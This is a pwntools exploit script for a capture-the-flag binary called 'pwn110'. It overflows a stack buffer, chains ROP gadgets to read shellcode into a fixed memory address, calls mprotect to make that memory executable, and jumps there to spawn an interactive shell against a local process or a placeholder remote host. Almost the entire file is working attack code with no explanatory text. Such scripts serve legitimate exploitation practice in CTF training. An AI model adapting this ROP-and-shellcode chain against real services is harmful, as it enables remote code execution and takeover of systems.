#!/usr/bin/env python3

from pwn import *

exe = ELF("./pwn110-1644300525386.pwn110_patched")

context.binary = exe
context.arch = "amd64"

shellcode = asm(shellcraft.sh())

log.info(f"Shellcode: {len(shellcode)}")

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r

pop_rax_ret = 0x00000000004497d7
pop_rdi_ret = 0x000000000040191a
pop_rsi_ret = 0x000000000040f4de
pop_rdx_ret = 0x000000000040181f
syscall_ret = 0x00000000004173d4
mprotect_ret = 0x0000000000449b70

target = 0x4c0000

def main():
    r = conn()
    r.recvuntil("\x8f\n")
    gdb.attach(r,"""
    b * main + 75
    c
    """)
    payload = flat(
        "A" * 40,
        p64(pop_rdi_ret),
        p64(0),
        p64(pop_rsi_ret),
        p64(target),
        p64(pop_rdx_ret),
        p64(48),
        p64(pop_rax_ret),
        p64(0),
        p64(syscall_ret),
        p64(exe.symbols["main"]),
        p64(exe.symbols["main"])

    )
    r.sendline(payload)
    r.sendline(shellcode)
    # r.sendline(b"/bin/sh\x00")
    
    payload2 = flat(
        "A" * 40,
        p64(pop_rdi_ret),
        p64(target),
        p64(pop_rsi_ret),
        p64(1000),
        p64(pop_rdx_ret),
        p64(0x7),
        p64(mprotect_ret),
        p64(target)

    )
    r.sendline(payload2)
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
